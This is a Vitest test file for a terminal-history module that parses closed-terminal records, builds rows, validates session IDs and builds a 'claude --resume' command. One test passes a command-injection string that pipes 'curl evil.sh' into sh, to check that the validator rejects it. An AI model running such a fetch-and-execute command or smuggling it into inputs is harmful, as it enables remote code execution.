import { describe, it, expect } from 'vitest';
import {
  closedTerminalsOf,
  buildClosedTerminalRows,
  isClaudeSessionId,
  resumeStartupCommand,
  terminalRestoreSupported,
} from './closedTerminals';

describe('closedTerminalsOf', () => {
  it('returns [] when the field is missing (old daemon) or malformed', () => {
    expect(closedTerminalsOf(undefined)).toEqual([]);
    expect(closedTerminalsOf(null)).toEqual([]);
    expect(closedTerminalsOf({})).toEqual([]);
    expect(closedTerminalsOf({ closedTerminals: 'nope' })).toEqual([]);
    expect(closedTerminalsOf({ closedTerminals: { id: 'a' } })).toEqual([]);
  });

  it('keeps valid records and drops malformed items one by one', () => {
    const out = closedTerminalsOf({
      closedTerminals: [
        { id: 'a', title: 'build', cwd: '/repo', closedAt: 100 },
        null,
        { id: '', closedAt: 1 },
        { id: 'no-time' },
        { id: 'b', closedAt: 200, title: 42, cwd: 7 },
      ],
    });
    expect(out).toEqual([
      { id: 'a', title: 'build', cwd: '/repo', closedAt: 100 },
      { id: 'b', title: undefined, cwd: undefined, closedAt: 200 },
    ]);
  });

  it('normalizes empty/whitespace titles and empty cwd to undefined', () => {
    const out = closedTerminalsOf({
      closedTerminals: [{ id: 'a', title: '  ', cwd: '', closedAt: 1 }],
    });
    expect(out[0].title).toBeUndefined();
    expect(out[0].cwd).toBeUndefined();
  });

  it('B-105: keeps a string mirrorSessionId, drops junk shapes', () => {
    const out = closedTerminalsOf({
      closedTerminals: [
        { id: 'a', closedAt: 1, mirrorSessionId: 'mir-1' },
        { id: 'b', closedAt: 2, mirrorSessionId: 42 },
        { id: 'c', closedAt: 3, mirrorSessionId: '' },
        { id: 'd', closedAt: 4 },
      ],
    });
    expect(out.map((r) => r.mirrorSessionId)).toEqual(['mir-1', undefined, undefined, undefined]);
  });
});

describe('buildClosedTerminalRows', () => {
  const machine = (id: string, records: unknown[], opts?: { name?: string; online?: boolean }) => ({
    id,
    name: opts?.name ?? `machine-${id}`,
    online: opts?.online ?? true,
    daemonState: { closedTerminals: records },
  });

  it('merges machines and sorts newest-first across them', () => {
    const rows = buildClosedTerminalRows(
      [
        machine('m1', [{ id: 'a', closedAt: 100 }, { id: 'b', closedAt: 300 }]),
        machine('m2', [{ id: 'c', closedAt: 200 }]),
      ],
      new Set(),
    );
    expect(rows.map((r) => r.terminalId)).toEqual(['b', 'c', 'a']);
    expect(rows[1].machineId).toBe('m2');
    expect(rows[1].key).toBe('ct:m2:c');
  });

  it('drops records whose terminal is live again', () => {
    const rows = buildClosedTerminalRows(
      [machine('m1', [{ id: 'a', closedAt: 1 }, { id: 'b', closedAt: 2 }])],
      new Set(['a']),
    );
    expect(rows.map((r) => r.terminalId)).toEqual(['b']);
  });

  it('B-105: rows carry mirrorSessionId through (structured-history link)', () => {
    const rows = buildClosedTerminalRows(
      [machine('m1', [{ id: 'a', closedAt: 1, mirrorSessionId: 'mir-1' }, { id: 'b', closedAt: 2 }])],
      new Set(),
    );
    expect(rows.find((r) => r.terminalId === 'a')!.mirrorSessionId).toBe('mir-1');
    expect(rows.find((r) => r.terminalId === 'b')!.mirrorSessionId).toBeUndefined();
  });

  it('falls back to the machine name when the record has no title', () => {
    const rows = buildClosedTerminalRows(
      [machine('m1', [{ id: 'a', closedAt: 1 }], { name: 'dev-laptop' })],
      new Set(),
    );
    expect(rows[0].title).toBe('dev-laptop');
  });

  it('carries cwd, machine name and online state through', () => {
    const rows = buildClosedTerminalRows(
      [machine('m1', [{ id: 'a', cwd: '/repo', closedAt: 1 }], { online: false })],
      new Set(),
    );
    expect(rows[0].cwd).toBe('/repo');
    expect(rows[0].machineName).toBe('machine-m1');
    expect(rows[0].machineOnline).toBe(false);
  });

  it('renders nothing for machines without the field (old daemons)', () => {
    const rows = buildClosedTerminalRows(
      [{ id: 'm1', name: 'x', online: true, daemonState: { webTerminals: { updatedAt: 1, terminals: [] } } }],
      new Set(),
    );
    expect(rows).toEqual([]);
  });
});

// ── B-149: continue a terminal that died in a restart ────────────────────────

const UUID = 'c0c26854-5e0c-4063-aaeb-d4428fe8ed94';

describe('resume ids (B-149)', () => {
  it('accepts only uuids — the value ends up in a shell command', () => {
    expect(isClaudeSessionId(UUID)).toBe(true);
    expect(isClaudeSessionId('c0c26854')).toBe(false);
    expect(isClaudeSessionId(`${UUID} && curl evil.sh | sh`)).toBe(false);
    expect(isClaudeSessionId(undefined)).toBe(false);
  });

  it('builds the resume command from a valid id and nothing from junk', () => {
    expect(resumeStartupCommand(UUID)).toBe(`claude --resume ${UUID}`);
    expect(resumeStartupCommand('nope')).toBeUndefined();
    expect(resumeStartupCommand(undefined)).toBeUndefined();
  });

  it('parses claudeSessionId / reason, dropping malformed values', () => {
    const [ok] = closedTerminalsOf({
      closedTerminals: [{ id: 'a', closedAt: 1, claudeSessionId: UUID, reason: 'daemon-gap' }],
    });
    expect(ok.claudeSessionId).toBe(UUID);
    expect(ok.reason).toBe('daemon-gap');

    const [junk] = closedTerminalsOf({
      closedTerminals: [{ id: 'b', closedAt: 1, claudeSessionId: 'not-a-uuid', reason: 'exploded' }],
    });
    expect(junk.claudeSessionId).toBeUndefined();
    expect(junk.reason).toBeUndefined();
  });

  it('surfaces the resume id and the gap flag on the row', () => {
    const rows = buildClosedTerminalRows(
      [{
        id: 'm1', name: 'dev-laptop', online: true,
        daemonState: {
          closedTerminals: [
            { id: 'gap', closedAt: 2, cwd: '/tmp', claudeSessionId: UUID, reason: 'daemon-gap' },
            { id: 'plain', closedAt: 1, cwd: '/tmp' },
          ],
        },
      }],
      new Set<string>(),
    );
    expect(rows.map((r) => [r.terminalId, r.claudeSessionId, r.fromDaemonGap])).toEqual([
      ['gap', UUID, true],
      ['plain', undefined, false],
    ]);
  });
});

describe('B-265 restore in place', () => {
  it('parses tags/manual tolerantly and never fabricates them', () => {
    const out = closedTerminalsOf({ closedTerminals: [
      { id: 'a', closedAt: 1, tags: ['x', 2, ''], manual: true },
      { id: 'b', closedAt: 2, tags: 'nope', manual: 'yes' },
    ] });
    expect(out[0]).toMatchObject({ id: 'a', tags: ['x'], manual: true });
    expect('tags' in out[1]).toBe(false);
    expect('manual' in out[1]).toBe(false);
  });
  it('trusts the terminalRestore flag only when stamped by the current daemon run', () => {
    expect(terminalRestoreSupported({ startedAt: 100, terminalRestore: { rpcAvailable: true, detectedAt: 100 } })).toBe(true);
    expect(terminalRestoreSupported({ startedAt: 200, terminalRestore: { rpcAvailable: true, detectedAt: 100 } })).toBe(false); // downgraded daemon spread it forward
    expect(terminalRestoreSupported({ startedAt: 100, terminalRestore: { rpcAvailable: false, detectedAt: 100 } })).toBe(false);
    expect(terminalRestoreSupported({ startedAt: 100 })).toBe(false);
    expect(terminalRestoreSupported(undefined)).toBe(false);
  });
  it('rows carry tags and the per-machine restore capability', () => {
    const rows = buildClosedTerminalRows([
      { id: 'm1', name: 'M1', online: true, daemonState: { startedAt: 1, terminalRestore: { rpcAvailable: true, detectedAt: 1 }, closedTerminals: [{ id: 'a', closedAt: 5, cwd: '/w', tags: ['t'], manual: true }] } },
      { id: 'm2', name: 'M2', online: true, daemonState: { startedAt: 1, closedTerminals: [{ id: 'b', closedAt: 4, cwd: '/w' }] } },
    ], new Set());
    expect(rows[0]).toMatchObject({ terminalId: 'a', tags: ['t'], manual: true, restoreSupported: true });
    expect(rows[1]).toMatchObject({ terminalId: 'b', restoreSupported: false });
    expect(rows[1].tags).toBeUndefined();
  });
});

describe('B-273 tmuxSessionsSupported', () => {
    it('same trust rule as terminalRestore: flag must be stamped by THIS daemon run', async () => {
        const { tmuxSessionsSupported } = await import('./closedTerminals');
        expect(tmuxSessionsSupported(undefined)).toBe(false);
        expect(tmuxSessionsSupported({ startedAt: 10 })).toBe(false);
        expect(tmuxSessionsSupported({ startedAt: 10, tmuxSessions: { rpcAvailable: true, detectedAt: 10 } })).toBe(true);
        expect(tmuxSessionsSupported({ startedAt: 20, tmuxSessions: { rpcAvailable: true, detectedAt: 10 } })).toBe(false); // downgraded daemon
        expect(tmuxSessionsSupported({ startedAt: 10, tmuxSessions: { rpcAvailable: false, detectedAt: 10 } })).toBe(false);
    });
});
